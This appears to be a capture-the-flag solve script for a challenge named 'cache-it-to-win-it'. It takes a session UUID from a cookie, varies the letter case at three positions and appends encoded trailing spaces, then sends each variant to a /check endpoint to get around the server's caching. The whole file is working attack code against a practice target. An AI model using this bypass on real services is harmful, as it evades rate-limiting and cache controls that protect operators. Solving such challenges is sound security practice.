import requests
import re

URL = "https://cache-it-to-win-it.chall.lac.tf"

uuid = ""

while len(re.findall("-[a-f]", uuid)) < 3:
    print("UUID received:", uuid)

    uuid = requests.get(URL).cookies.get("id")

uuid = list(uuid)

for i in range(0b111 + 1):
    for idx, c_idx in enumerate([9, 19, 24]):
        if i & (0b1 << idx):
            uuid[c_idx] = uuid[c_idx].upper()
        else:
            uuid[c_idx] = uuid[c_idx].lower()
    print("".join(uuid))

    for j in range(13):
        print("URL", URL + "/check?uuid=" + "".join(uuid) + ("%20" * j))
        r = requests.get(URL + "/check?uuid=" + "".join(uuid) + ("%20" * j))
        print(r.text)
